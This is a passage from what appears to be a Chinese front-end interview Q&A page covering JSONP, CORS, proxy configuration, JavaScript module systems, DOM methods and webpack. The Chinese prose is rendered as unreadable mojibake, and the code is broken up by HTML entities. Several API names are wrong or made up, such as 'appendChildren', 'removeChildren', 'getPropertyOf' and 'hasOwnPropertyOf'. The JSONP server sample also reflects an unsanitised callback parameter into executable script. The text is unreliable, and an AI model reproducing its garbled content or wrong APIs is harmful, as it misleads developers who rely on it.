loaded')&#125;const body = document.bodybody.append(script)body.removeChild(script) æœåŠ¡å™¨ç«¯ 12345678910const express = require('express')const app = express()app.listen(8080, () =&gt; &#123; console.log('ok')&#125;)app.get('/list', (req, res) =&gt; &#123; const &#123; callback = Function.prototype &#125; = req.query const data = &#123; name: 'winfar', age: 18 &#125; res.send(`$&#123;callback&#125;($&#123;JSON.stringify(data)&#125;)`)&#125;) CORSå®¢æˆ·ç«¯ 123fetch('http://otherdomain.com/list', &#123; method: 'get' &#125;).then((response) =&gt; &#123; console.log('response: ', response)&#125;) æœåŠ¡ç«¯ 123456789101112131415const express = require('express')const app = express()app.use((req, res, next) =&gt; &#123; res.header('Access-Control-Allow-Origin', 'http://domain.com') res.header('Access-Control-Allow-Credentials', true) res.header('Access-Control-Allow-Headers', 'Content-Type,Content-Length,Authorization,Accept,X-Requested-with') res.header('Access-Control-Allow-Methods', 'PUT,POST,GET,DELETE,OPTIONS,HEAD') req.method === 'OPTIONS' ? res.send('CURRENT SERVICES SUPPORT CROSS DOMAIN REQUESTS') : next()&#125;)app.listen(80)app.get('/list', (req, res) =&gt; &#123; const data = &#123; name: 'winfar', age: 18 &#125; res.send(JSON.stringify(data))&#125;) Proxywebpack &amp;&amp; dev-server 12345678910111213141516171819202122232425const path = require('path')const HtmlWebpackPlugin = require('html-webpack-plugin')module.exports = &#123; mode: 'development', entry: './src/main.js', output: &#123; filename: 'main.[hash].min.js', path: path.resolve(__dirname, 'build') &#125;, devServer: &#123; port: '8080', proxy: &#123; '/': &#123; target: 'http://otherdomain.com', changeOrigin: true &#125; &#125; &#125;, plugins: [ new HtmlWebpackPlugin(&#123; template: './public/index.html', filename: 'index.html' &#125;) ]&#125; nginx123456789server &#123; listen 80; server_name http://domain.com; location / &#123; proxy_pass http://otherdomain.com; root html; index index.html index.htm; &#125;&#125; é¡µé¢ç¼–ç å’Œè¢«è¯·æ±‚çš„èµ„æºç¼–ç å¦‚æžœä¸ä¸€è‡´å¦‚ä½•å¤„ç†ï¼Ÿåœ¨å¼•å…¥èµ„æºè®¾ç½®å“åº”çš„ç¼–ç æ ¼å¼ï¼Œ&lt;script src=&quot;http://xxx.com/a.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; AMDï¼ˆModules/Asynchronous-Definitionï¼‰ã€CMDï¼ˆCommon Module Definitionï¼‰è§„èŒƒåŒºåˆ«ï¼Ÿ AMD å¼‚æ­¥æ¨¡å—å®šä¹‰ï¼Œæ˜¯ RequireJS åœ¨æŽ¨å¹¿è¿‡ç¨‹ä¸­å¯¹æ¨¡å—å®šä¹‰çš„è§„èŒƒåŒ–äº§å‡º CMD é€šç”¨æ¨¡å—å®šä¹‰ï¼Œæ˜¯ SeaJS åœ¨æŽ¨å¹¿è¿‡ç¨‹ä¸­å¯¹æ¨¡å—å®šä¹‰çš„è§„èŒƒåŒ–äº§å‡º è¿™äº›è§„èŒƒçš„ç›®çš„éƒ½æ˜¯ä¸ºäº† JavaScript çš„æ¨¡å—åŒ–å¼€å‘ï¼Œç‰¹åˆ«æ˜¯åœ¨æµè§ˆå™¨ç«¯çš„ï¼Œ ç›®å‰è¿™äº›è§„èŒƒçš„å®žçŽ°éƒ½èƒ½è¾¾æˆæµè§ˆå™¨ç«¯æ¨¡å—åŒ–å¼€å‘çš„ç›®çš„ åŒºåˆ«ï¼š å¯¹äºŽä¾èµ–çš„æ¨¡å—ï¼ŒAMD æ˜¯æå‰æ‰§è¡Œï¼ŒCMD æ˜¯å»¶è¿Ÿæ‰§è¡Œã€‚ä¸è¿‡ RequireJS ä»Ž 2.0 å¼€å§‹ï¼Œä¹Ÿæ”¹æˆå¯ä»¥å»¶è¿Ÿæ‰§è¡Œï¼ˆæ ¹æ®å†™æ³•ä¸åŒï¼Œå¤„ç†æ–¹å¼ä¸åŒï¼‰ã€‚CMD æŽ¨å´‡ as lazy as possible CMD æŽ¨å´‡ä¾èµ–å°±è¿‘ï¼ŒAMD æŽ¨å´‡ä¾èµ–å‰ç½® AMD çš„ API é»˜è®¤æ˜¯ä¸€ä¸ªå½“å¤šä¸ªç”¨ï¼ŒCMD çš„ API ä¸¥æ ¼åŒºåˆ†ï¼ŒæŽ¨å´‡èŒè´£å•ä¸€ è¯´è¯´ä½ å¯¹ AMD å’Œ CommonJS çš„äº†è§£ä»–ä»¬éƒ½æ˜¯å®žçŽ°æ¨¡å—æç¤ºçš„æ–¹å¼ï¼ŒçŸ¥é“ ES2015 å‡ºçŽ°ä¹‹å‰ï¼Œjavascript ä¸€ç›´æ²¡æœ‰æ¨¡å—åŒ–ä½“ç³»ã€‚CommonJS æ˜¯åŒæ­¥çš„ï¼Œè€Œ AMDï¼ˆAsynchronous Module Definitionï¼‰ä»Žå…¨ç§°ä¸­å¯ä»¥æ˜Žæ˜¾çœ‹å‡ºæ˜¯å¼‚æ­¥çš„ã€‚CommonJS çš„è®¾è®¡æ˜¯ä¸ºæœåŠ¡å™¨ç«¯å¼€å‘è€ƒè™‘çš„ï¼Œè€Œ AMD æ”¯æŒå¼‚æ­¥åŠ è½½æ¨¡å—ï¼Œæ›´é€‚åˆæµè§ˆå™¨ã€‚ æˆ‘å‘çŽ° AMD çš„è¯­æ³•éžå¸¸å†—é•¿ï¼ŒCommonJS æ›´æŽ¥è¿‘å…¶ä»–è¯­è¨€ import å£°æ˜Žè¯­å¥çš„ç”¨æ³•ä¹ æƒ¯ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæˆ‘è®¤ä¸º AMD æ²¡æœ‰ä½¿ç”¨çš„å¿…è¦ï¼Œå› ä¸ºå¦‚æžœæŠŠæ‰€æœ‰ JavaScript éƒ½æ†ç»‘è¿›ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œå°†æ— æ³•å¾—åˆ°å¼‚æ­¥åŠ è½½çš„å¥½å¤„ã€‚æ­¤å¤–ï¼ŒCommonJS è¯­æ³•ä¸Šæ›´æŽ¥è¿‘ Node ç¼–å†™æ¨¡å—çš„é£Žæ ¼ï¼Œåœ¨å‰åŽç«¯éƒ½ä½¿ç”¨ JavaScript å¼€å‘ä¹‹é—´è¿›è¡Œåˆ‡æ¢æ—¶ï¼Œè¯­å¢ƒçš„åˆ‡æ¢å¼€é”€è¾ƒå°ã€‚ ES6 æ¨¡å—ä¸Ž CommonJS æ¨¡å—çš„å·®å¼‚ CommonJS æ¨¡å—è¾“å‡ºçš„æ˜¯ä¸€ä¸ªå€¼çš„æ‹·è´ï¼ŒES6 æ¨¡å—è¾“å‡ºçš„æ˜¯å€¼çš„å¼•ç”¨ï¼› CommonJS æ¨¡å—æ˜¯è¿è¡Œæ—¶åŠ è½½ï¼ŒES6 æ¨¡å—æ˜¯ç¼–è¯‘æ—¶è¾“å‡ºæŽ¥å£ï¼ˆé™æ€ç¼–è¯‘ï¼‰ï¼› CommonJS æ˜¯å•å€¼å¯¼å‡ºï¼Œ ES6 Module å¯ä»¥æ˜¯å¯¼å‡ºå¤šä¸ªï¼› CommonJS æ˜¯åŠ¨æ€è¯­æ³•å¯ä»¥å†™åœ¨åˆ¤æ–­é‡Œï¼ŒES6 Module é™æ€è¯­æ³•åªèƒ½å†™åœ¨é¡¶å±‚ï¼› CommonJS æ¨¡å—çš„ require() æ˜¯åŒæ­¥åŠ è½½æ¨¡å—ï¼ŒES6 æ¨¡å—çš„ import å‘½ä»¤æ˜¯å¼‚æ­¥åŠ è½½ï¼Œæœ‰ä¸€ä¸ªç‹¬ç«‹çš„æ¨¡å—ä¾èµ–çš„è§£æžé˜¶æ®µï¼› CommonJS æ¨¡å—çš„é¡¶å±‚ this æŒ‡å‘å½“å‰æ¨¡å—ï¼ŒES6 æ¨¡å—ä¹‹ä¸­ï¼Œé¡¶å±‚çš„ this æŒ‡å‘ undefinedã€‚ CommonJS ä¸­çš„ require/exports å’Œ ES6 ä¸­çš„ import/export åŒºåˆ«ï¼Ÿ CommonJS æ¨¡å—çš„é‡è¦ç‰¹æ€§æ˜¯åŠ è½½æ—¶æ‰§è¡Œï¼Œå³è„šæœ¬ä»£ç åœ¨ require çš„æ—¶å€™ï¼Œå°±ä¼šå…¨éƒ¨æ‰§è¡Œã€‚ä¸€æ—¦å‡ºçŽ°æŸä¸ªæ¨¡å—è¢«â€å¾ªçŽ¯åŠ è½½â€ï¼Œå°±åªè¾“å‡ºå·²ç»æ‰§è¡Œçš„éƒ¨åˆ†ï¼Œè¿˜æœªæ‰§è¡Œçš„éƒ¨åˆ†ä¸ä¼šè¾“å‡ºã€‚ ES6 æ¨¡å—æ˜¯åŠ¨æ€å¼•ç”¨ï¼Œå¦‚æžœä½¿ç”¨ import ä»Žä¸€ä¸ªæ¨¡å—åŠ è½½å˜é‡ï¼Œé‚£äº›å˜é‡ä¸ä¼šè¢«ç¼“å­˜ï¼Œè€Œæ˜¯æˆä¸ºä¸€ä¸ªæŒ‡å‘è¢«åŠ è½½æ¨¡å—çš„å¼•ç”¨ï¼Œéœ€è¦å¼€å‘è€…è‡ªå·±ä¿è¯ï¼ŒçœŸæ­£å–å€¼çš„æ—¶å€™èƒ½å¤Ÿå–åˆ°å€¼ã€‚ import/export æœ€ç»ˆéƒ½æ˜¯ç¼–è¯‘ä¸º require/exports æ¥æ‰§è¡Œçš„ã€‚ CommonJS è§„èŒƒè§„å®šï¼Œæ¯ä¸ªæ¨¡å—å†…éƒ¨ï¼Œ module å˜é‡ä»£è¡¨å½“å‰æ¨¡å—ã€‚è¿™ä¸ªå˜é‡æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒçš„ exports å±žæ€§ï¼ˆå³ module.exports ï¼‰æ˜¯å¯¹å¤–çš„æŽ¥å£ã€‚åŠ è½½æŸä¸ªæ¨¡å—ï¼Œå…¶å®žæ˜¯åŠ è½½è¯¥æ¨¡å—çš„ module.exports å±žæ€§ã€‚ export å‘½ä»¤è§„å®šçš„æ˜¯å¯¹å¤–çš„æŽ¥å£ï¼Œå¿…é¡»ä¸Žæ¨¡å—å†…éƒ¨çš„å˜é‡å»ºç«‹ä¸€ä¸€å¯¹åº”å…³ç³»ã€‚ å‚è€ƒ:Module çš„åŠ è½½å®žçŽ°ã€Œä¸‡å­—è¿›é˜¶ã€æ·±å…¥æµ…å‡º Commonjs å’Œ Es Module tree-shaking åŽŸç†tree-shaking æ˜¯é€šè¿‡æ¸…é™¤å¤šä½™ä»£ç æ–¹å¼æ¥ä¼˜åŒ–æ‰“åŒ…ä½“ç§¯çš„æŠ€æœ¯ã€‚ES6 Module å¼•å…¥è¿›è¡Œé™æ€åˆ†æžï¼Œæ•…è€Œç¼–è¯‘çš„æ—¶å€™æ­£ç¡®åˆ¤æ–­åˆ°åº•åŠ è½½äº†é‚£äº›æ¨¡å—ã€‚é™æ€åˆ†æžç¨‹åºæµï¼Œåˆ¤æ–­é‚£äº›æ¨¡å—å’Œå˜é‡æœªè¢«ä½¿ç”¨æˆ–è€…å¼•ç”¨ï¼Œè¿›è€Œåˆ é™¤å¯¹åº”ä»£ç ã€‚ importå¼•å…¥è„šæœ¬æ–‡ä»¶çœç•¥åŽç¼€åï¼ŒNode ä¼šæ€Žæ ·æŸ¥æ‰¾ï¼Ÿå¦‚æžœè„šæœ¬æ–‡ä»¶çœç•¥äº†åŽç¼€åï¼Œæ¯”å¦‚import &#39;./foo&#39;ï¼ŒNode ä¼šä¾æ¬¡å°è¯•å››ä¸ªåŽç¼€åï¼š./foo.mjsã€./foo.jsã€./foo.jsonã€./foo.nodeã€‚å¦‚æžœè¿™äº›è„šæœ¬æ–‡ä»¶éƒ½ä¸å­˜åœ¨ï¼ŒNode å°±ä¼šåŽ»åŠ è½½./foo/package.jsonçš„ main å­—æ®µæŒ‡å®šçš„è„šæœ¬ã€‚å¦‚æžœ./foo/package.jsonä¸å­˜åœ¨æˆ–è€…æ²¡æœ‰ main å­—æ®µï¼Œé‚£ä¹ˆå°±ä¼šä¾æ¬¡åŠ è½½./foo/index.mjsã€./foo/index.jsã€./foo/index.jsonã€./foo/index.nodeã€‚å¦‚æžœä»¥ä¸Šå››ä¸ªæ–‡ä»¶è¿˜æ˜¯éƒ½ä¸å­˜åœ¨ï¼Œå°±ä¼šæŠ›å‡ºé”™è¯¯ã€‚ è¯·è§£é‡Šä¸‹é¢ä»£ç ä¸ºä»€ä¹ˆä¸èƒ½ç”¨ä½œ IIFEï¼šfunction foo(){ }();ï¼Œéœ€è¦ä½œå‡ºå“ªäº›ä¿®æ”¹æ‰èƒ½ä½¿å…¶æˆä¸º IIFEï¼ŸIIFEï¼ˆImmediately Invoked Function Expressionsï¼‰ä»£è¡¨ç«‹å³æ‰§è¡Œå‡½æ•°ã€‚ JavaScript è§£æžå™¨å°† function foo(){ }();è§£æžæˆfunction foo(){ }å’Œ();ã€‚å…¶ä¸­ï¼Œå‰è€…æ˜¯å‡½æ•°å£°æ˜Žï¼›åŽè€…ï¼ˆä¸€å¯¹æ‹¬å·ï¼‰æ˜¯è¯•å›¾è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå´æ²¡æœ‰æŒ‡å®šåç§°ï¼Œå› æ­¤å®ƒä¼šæŠ›å‡ºUncaught SyntaxError: Unexpected tokençš„é”™è¯¯ã€‚ ä¿®æ”¹æ–¹æ³•æ˜¯ï¼šå†æ·»åŠ ä¸€å¯¹æ‹¬å·ï¼Œå½¢å¼ä¸Šæœ‰ä¸¤ç§ï¼š(function foo(){ })()å’Œ(function foo(){ }())ã€‚ä»¥ä¸Šå‡½æ•°ä¸ä¼šæš´éœ²åˆ°å…¨å±€ä½œç”¨åŸŸï¼Œå¦‚æžœä¸éœ€è¦åœ¨å‡½æ•°å†…éƒ¨å¼•ç”¨è‡ªèº«ï¼Œå¯ä»¥çœç•¥å‡½æ•°çš„åç§°ã€‚ documen.write å’Œ innerHTML çš„åŒºåˆ«ï¼Ÿdocument.write åªèƒ½é‡ç»˜æ•´ä¸ªé¡µé¢ï¼ŒinnerHTML å¯ä»¥é‡ç»˜é¡µé¢çš„ä¸€éƒ¨åˆ† DOM æ“ä½œâ€”â€”æ€Žæ ·æ·»åŠ ã€ç§»é™¤ã€ç§»åŠ¨ã€å¤åˆ¶ã€åˆ›å»ºå’ŒæŸ¥æ‰¾èŠ‚ç‚¹ï¼Ÿ åˆ›å»ºèŠ‚ç‚¹ document.createDocumentFragment() // æ–‡æ¡£ç¢Žç‰‡ document.createElement(å…ƒç´ æ ‡ç­¾) // åˆ›å»ºå…ƒç´ èŠ‚ç‚¹ document.createTextNode(æ–‡æœ¬å†…å®¹) // åˆ›å»ºæ–‡æœ¬èŠ‚ç‚¹ æ·»åŠ ã€ç§»é™¤ã€å¤åˆ¶ç³»èŠ‚ç‚¹ çˆ¶èŠ‚ç‚¹.appendChildren(è¦æ·»åŠ çš„å­èŠ‚ç‚¹) // æ·»åŠ å­èŠ‚ç‚¹ çˆ¶èŠ‚ç‚¹.removeChildren(è¦åˆ é™¤çš„å­èŠ‚ç‚¹) // ç§»é™¤å­èŠ‚ç‚¹ è¢«å¤åˆ¶çš„èŠ‚ç‚¹.cloneNode(true/false) //å¤åˆ¶èŠ‚ç‚¹ æŸ¥æ‰¾ DOM.getElementsByTagName() // æ ‡ç­¾æŸ¥æ‰¾ DOM.getElementsByName() // name å±žæ€§æŸ¥æ‰¾ DOM.getElementById() // id æŸ¥æ‰¾ æ•°ç»„å’Œå¯¹è±¡æœ‰å“ªäº›åŽŸç”Ÿæ–¹æ³•ï¼Œåˆ—ä¸¾ä¸€ä¸‹ï¼Ÿ æ•°ç»„ï¼špush, pop, shift, unshift, concat, splice, slice å…¶ä¸­é˜Ÿåˆ—æ–¹æ³•ï¼špush, shiftæ ˆæ–¹æ³•ï¼špush, pop å¯¹è±¡ï¼šassign, create, defineProperty, defineProperty, entries, freeze, getOwnPropertyDescriptor, getOwnPropertyDescriptors, getOwnPropertyNames, getOwnPropertySymbols, getPropertyOf, is, isExtensible, isFrozen, hasOwnPropertyOf jquery.extend ä¸Ž jquery.fn.extend çš„åŒºåˆ«ï¼Ÿ jquery.extend ä¸º jquery ç±»æ·»åŠ ç±»æ–¹æ³•ï¼Œå¯ä»¥ç†è§£ä¸ºæ·»åŠ é™æ€æ–¹æ³• æºç ä¸­jquery.fn = jquery.prototypeï¼Œæ‰€ä»¥å¯¹ jquery.fn çš„æ‰©å±•ï¼Œå°±æ˜¯ä¸º jquery ç±»æ·»åŠ æˆå‘˜å‡½æ•°ä½¿ç”¨ jquery.extendæ‰©å±•ï¼Œéœ€è¦é€šè¿‡ jquery ç±»æ¥è°ƒç”¨ï¼Œè€Œ jquery.fn.extend æ‰©å±•ï¼Œæ‰€æœ‰ jquery å®žä¾‹éƒ½å¯ä»¥ç›´æŽ¥è°ƒç”¨ ä»€ä¹ˆæ˜¯ polyfillï¼Ÿpolyfill æ˜¯â€œåœ¨æ—§ç‰ˆæµè§ˆå™¨ä¸Šå¤åˆ¶æ ‡å‡† API çš„ JavaScript è¡¥å……â€,å¯ä»¥åŠ¨æ€åœ°åŠ è½½ JavaScript ä»£ç æˆ–åº“ï¼Œåœ¨ä¸æ”¯æŒè¿™äº›æ ‡å‡† API çš„æµè§ˆå™¨ä¸­æ¨¡æ‹Ÿå®ƒä»¬ã€‚ ä¾‹å¦‚ï¼Œgeolocationï¼ˆåœ°ç†ä½ç½®ï¼‰polyfill å¯ä»¥åœ¨ navigator å¯¹è±¡ä¸Šæ·»åŠ å…¨å±€çš„ geolocation å¯¹è±¡ï¼Œè¿˜èƒ½æ·»åŠ  getCurrentPosition å‡½æ•°ä»¥åŠâ€œåæ ‡â€å›žè°ƒå¯¹è±¡ï¼Œæ‰€æœ‰è¿™äº›éƒ½æ˜¯ W3C åœ°ç†ä½ç½® API å®šä¹‰çš„å¯¹è±¡å’Œå‡½æ•°ã€‚å› ä¸º polyfill æ¨¡æ‹Ÿæ ‡å‡† APIï¼Œæ‰€ä»¥èƒ½å¤Ÿä»¥ä¸€ç§é¢å‘æ‰€æœ‰æµè§ˆå™¨æœªæ¥çš„æ–¹å¼é’ˆå¯¹è¿™äº› API è¿›è¡Œå¼€å‘ï¼Œä¸€æ—¦å¯¹è¿™äº› API çš„æ”¯æŒå˜æˆç»å¯¹å¤§å¤šæ•°ï¼Œåˆ™å¯ä»¥æ–¹ä¾¿åœ°åŽ»æŽ‰ polyfillï¼Œæ— éœ€åšä»»ä½•é¢å¤–å·¥ä½œã€‚ è°ˆè°ˆä½ å¯¹ webpack çš„çœ‹æ³•ï¼ŸWebPack æ˜¯ä¸€ä¸ªæ¨¡å—æ‰“åŒ…å·¥å…·ï¼Œä½ å¯ä»¥ä½¿ç”¨ WebPack ç®¡ç†ä½ çš„æ¨¡å—ä¾èµ–ï¼Œå¹¶ç¼–ç»Žè¾“å‡ºæ¨¡å—ä»¬æ‰€éœ€çš„é™æ€æ–‡ä»¶ã€‚å®ƒèƒ½å¤Ÿå¾ˆå¥½åœ°ç®¡ç†ã€æ‰“åŒ… Web å¼€å‘ä¸­æ‰€ç”¨åˆ°çš„ HTMLã€Javascriptã€CSS ä»¥åŠå„ç§é™æ€æ–‡ä»¶ï¼ˆå›¾ç‰‡ã€å­—ä½“ç­‰ï¼‰ï¼Œè®©å¼€å‘è¿‡ç¨‹æ›´åŠ é«˜æ•ˆã€‚å¯¹äºŽä¸åŒç±»åž‹çš„èµ„æºï¼Œwebpack æœ‰å¯¹åº”çš„æ¨¡å—åŠ è½½å™¨ã€‚webpack æ¨¡å—æ‰“åŒ…å™¨ä¼šåˆ†æžæ¨¡å—é—´çš„ä¾èµ–å…³ç³»ï¼Œæœ€åŽ ç”Ÿæˆäº†ä¼˜åŒ–ä¸”åˆå¹¶åŽçš„é™æ€èµ„æº Webpack çƒ­æ›´æ–°å®žçŽ°åŽŸç†? Webpack ç¼–è¯‘æœŸï¼Œä¸ºéœ€è¦çƒ­æ›´æ–°çš„ entry æ³¨å…¥çƒ­æ›´æ–°ä»£ç (EventSource é€šä¿¡) é¡µé¢é¦–æ¬¡æ‰“å¼€åŽï¼ŒæœåŠ¡ç«¯ä¸Žå®¢æˆ·ç«¯é€šè¿‡ EventSource å»ºç«‹é€šä¿¡æ¸ é“ï¼ŒæŠŠä¸‹ä¸€æ¬¡çš„ hash è¿”å›žå‰ç«¯ å®¢æˆ·ç«¯èŽ·å–åˆ° hashï¼Œè¿™ä¸ª hash å°†ä½œä¸ºä¸‹ä¸€æ¬¡è¯·æ±‚æœåŠ¡ç«¯ hot-update.js å’Œ hot-update.json çš„ hash ä¿®æ”¹é¡µé¢ä»£ç åŽï¼ŒWebpack ç›‘å¬åˆ°æ–‡ä»¶ä¿®æ”¹åŽï¼Œå¼€å§‹ç¼–è¯‘ï¼Œç¼–è¯‘å®ŒæˆåŽï¼Œå‘é€ build æ¶ˆæ¯ç»™å®¢æˆ·ç«¯ å®¢æˆ·ç«¯èŽ·å–åˆ° hashï¼ŒæˆåŠŸåŽå®¢æˆ·ç«¯æž„é€  hot-update.js script é“¾æŽ¥ï¼Œç„¶åŽæ’å…¥ä¸»æ–‡æ¡£ hot-update.js æ’å…¥æˆåŠŸåŽï¼Œæ‰§è¡Œ hotAPI çš„ createRecord å’Œ reload æ–¹æ³•ï¼ŒèŽ·å–åˆ° Vue ç»„ä»¶çš„ render æ–¹æ³•ï¼Œé‡æ–° render ç»„ä»¶ï¼Œ ç»§è€Œå®žçŽ° UI æ— åˆ·æ–°æ›´æ–°ã€‚ ES6 ä¸­å˜é‡å£°æ˜Žçš„ 6 ä¸­æ–¹æ³•varã€functionã€letã€constã€importã€class Object.is() ä¸ŽåŽŸæ¥çš„æ¯”è¾ƒæ“ä½œç¬¦â€œ ===â€ã€â€œ ==â€çš„åŒºåˆ«ï¼Ÿ ä¸¤ç­‰å·åˆ¤ç­‰ï¼Œä¼šåœ¨æ¯”è¾ƒæ—¶è¿›è¡Œç±»åž‹è½¬æ¢ ä¸‰ç­‰å·åˆ¤ç­‰ï¼Œæ¯”è¾ƒæ—¶ä¸è¿›è¡Œéšå¼ç±»åž‹è½¬æ¢ Object.isåœ¨ä¸‰ç­‰å·åŸºç¡€ä¸Šå¤„ç†äº†NaNã€-0 å’Œ+0ï¼Œä½¿å¾—-0å’Œ+0ä¸åŒï¼ŒObject.is(NaN, NaN)è¿”å›žtrue é¡µé¢é‡æž„æ€Žä¹ˆæ“ä½œï¼Ÿç½‘ç«™é‡æž„ï¼šåœ¨ä¸æ”¹å˜å¤–éƒ¨è¡Œä¸ºçš„å‰æä¸‹ï¼Œç®€åŒ–ç»“æž„ã€æ·»åŠ å¯è¯»æ€§ï¼Œè€Œåœ¨ç½‘ç«™å‰ç«¯ä¿æŒä¸€è‡´çš„è¡Œä¸ºã€‚ä¹Ÿå°±æ˜¯è¯´æ˜¯åœ¨ä¸æ”¹å˜ UI çš„æƒ…å†µä¸‹ï¼Œå¯¹ç½‘ç«™è¿›è¡Œä¼˜åŒ–ï¼Œåœ¨æ‰©å±•çš„åŒæ—¶ä¿æŒä¸€è‡´çš„ UIã€‚ å¯¹äºŽä¼ ç»Ÿçš„ç½‘ç«™æ¥è¯´é‡æž„é€šå¸¸æ˜¯ï¼š è¡¨æ ¼(table)å¸ƒå±€æ”¹ä¸º DIV+CSS ä½¿ç½‘ç«™å‰ç«¯å…¼å®¹äºŽçŽ°ä»£æµè§ˆå™¨(é’ˆå¯¹äºŽä¸åˆè§„èŒƒçš„ CSSã€å¦‚å¯¹ IE6 æœ‰æ•ˆçš„) å¯¹äºŽç§»åŠ¨å¹³å°çš„ä¼˜åŒ– é’ˆå¯¹äºŽ SEO è¿›è¡Œä¼˜åŒ– æ·±å±‚æ¬¡çš„ç½‘ç«™é‡æž„åº”è¯¥è€ƒè™‘çš„æ–¹é¢ å‡å°‘ä»£ç é—´çš„è€¦åˆ è®©ä»£ç ä¿æŒå¼¹æ€§ ä¸¥æ ¼æŒ‰è§„èŒƒç¼–å†™ä»£ç  è®¾è®¡å¯æ‰©å±•çš„ API ä»£æ›¿æ—§æœ‰çš„æ¡†æž¶ã€è¯­è¨€(å¦‚ VB) å¢žå¼ºç”¨æˆ·ä½“éªŒ é€šå¸¸æ¥è¯´å¯¹äºŽé€Ÿåº¦çš„ä¼˜åŒ–ä¹ŸåŒ…å«åœ¨é‡æž„ä¸­ åŽ‹ç¼© JSã€CSSã€image ç­‰å‰ç«¯èµ„æº(é€šå¸¸æ˜¯ç”±æœåŠ¡å™¨æ¥è§£å†³) ç¨‹åºçš„æ€§èƒ½ä¼˜åŒ–(å¦‚æ•°æ®è¯»å†™) é‡‡ç”¨ CDN æ¥åŠ é€Ÿèµ„æºåŠ è½½ å¯¹äºŽ JS DOM çš„ä¼˜åŒ– HTTP æœåŠ¡å™¨çš„æ–‡ä»¶ç¼“å­˜ è®¾è®¡æ¨¡å¼ çŸ¥é“ä»€ä¹ˆæ˜¯ singleton, factory, strategy, decrator ä¹ˆï¼Ÿ Singletonï¼Œå•ä¾‹æ¨¡å¼ï¼šä¿è¯ä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªå®žä¾‹ï¼Œå¹¶æä¾›ä¸€ä¸ªè®¿é—®å®ƒçš„å…¨å±€è®¿é—®ç‚¹ Factory Methodï¼Œå·¥åŽ‚æ–¹æ³•ï¼šå®šä¹‰ä¸€ä¸ªç”¨äºŽåˆ›å»ºå¯¹è±¡çš„æŽ¥å£ï¼Œè®©å­ç±»å†³å®šå®žä¾‹åŒ–å“ªä¸€ä¸ªç±»ï¼ŒFactory Method ä½¿ä¸€ä¸ªç±»çš„å®žä¾‹åŒ–å»¶è¿Ÿåˆ°äº†å­ç±» Strategyï¼Œç­–ç•¥æ¨¡å¼ï¼šå®šä¹‰ä¸€ç³»åˆ—çš„ç®—æ³•ï¼ŒæŠŠä»–ä»¬ä¸€ä¸ªä¸ªå°è£…èµ·æ¥ï¼Œå¹¶ä½¿ä»–ä»¬å¯ä»¥äº’ç›¸æ›¿æ¢ï¼Œæœ¬æ¨¡å¼ä½¿å¾—ç®—æ³•å¯ä»¥ç‹¬ç«‹äºŽä½¿ç”¨å®ƒä»¬çš„å®¢æˆ· Decratorï¼Œè£…é¥°æ¨¡å¼ï¼šåŠ¨æ€åœ°ç»™ä¸€ä¸ªå¯¹è±¡å¢žåŠ ä¸€äº›é¢å¤–çš„èŒè´£ï¼Œå°±å¢žåŠ çš„åŠŸèƒ½æ¥è¯´ï¼ŒDecorator æ¨¡å¼ç›¸æ¯”ç”Ÿæˆå­ç±»æ›´åŠ çµæ´» ä»€ä¹ˆå«ä¼˜é›…é™çº§å’Œæ¸è¿›å¢žå¼ºï¼Ÿ ä¼˜é›…é™çº§ï¼šWeb ç«™ç‚¹åœ¨æ‰€æœ‰æ–°å¼æµè§ˆå™¨ä¸­éƒ½èƒ½æ­£å¸¸å·¥ä½œï¼Œå¦‚æžœç”¨æˆ·ä½¿ç”¨çš„æ˜¯è€å¼æµè§ˆå™¨ï¼Œåˆ™ä»£ç ä¼šé’ˆå¯¹æ—§ç‰ˆæœ¬çš„ IE è¿›è¡Œé™çº§å¤„ç†äº†,ä½¿ä¹‹åœ¨æ—§å¼æµè§ˆå™¨ä¸Šä»¥æŸç§å½¢å¼é™çº§ä½“éªŒå´ä¸è‡³äºŽå®Œå…¨ä¸èƒ½ç”¨ã€‚å¦‚ï¼šborder-shadow æ¸è¿›å¢žå¼ºï¼šä»Žè¢«æ‰€æœ‰æµè§ˆå™¨æ”¯æŒçš„åŸºæœ¬åŠŸèƒ½å¼€å§‹ï¼Œé€æ­¥åœ°æ·»åŠ é‚£äº›åªæœ‰æ–°ç‰ˆæœ¬æµè§ˆå™¨æ‰æ”¯æŒçš„åŠŸèƒ½,å‘é¡µé¢å¢žåŠ ä¸å½±å“åŸºç¡€æµè§ˆå™¨çš„é¢å¤–æ ·å¼å’ŒåŠŸèƒ½çš„ã€‚å½“æµè§ˆå™¨æ”¯æŒæ—¶ï¼Œå®ƒä»¬ä¼šè‡ªåŠ¨åœ°å‘ˆçŽ°å‡ºæ¥å¹¶å‘æŒ¥ä½œç”¨ã€‚å¦‚ï¼šé»˜è®¤ä½¿ç”¨ flash ä¸Šä¼ ï¼Œä½†å¦‚æžœæµè§ˆå™¨æ”¯æŒ HTML5 çš„æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œåˆ™ä½¿ç”¨ HTML5 å®žçŽ°æ›´å¥½çš„ä½“éªŒ WEB åº”ç”¨ä»ŽæœåŠ¡å™¨ä¸»åŠ¨æŽ¨é€ Data åˆ°å®¢æˆ·ç«¯æœ‰é‚£äº›æ–¹å¼ï¼Ÿ html5 æä¾›çš„ Websocket ä¸å¯è§çš„ iframe WebSocket é€šè¿‡ Flash XHR é•¿æ—¶é—´è¿žæŽ¥ XHR Multipart Streaming &lt;script&gt;æ ‡ç­¾çš„é•¿æ—¶é—´è¿žæŽ¥(å¯è·¨åŸŸ) å¯¹ Node çš„ä¼˜ç‚¹å’Œç¼ºç‚¹æå‡ºäº†è‡ªå·±çš„çœ‹æ³•ï¼Ÿ ä¼˜ç‚¹ï¼šNode æ˜¯åŸºäºŽäº‹ä»¶é©±åŠ¨å’Œæ— é˜»å¡žçš„ï¼Œæ‰€ä»¥éžå¸¸é€‚åˆå¤„ç†å¹¶å‘è¯·æ±‚ ç¼ºç‚¹ï¼šNode 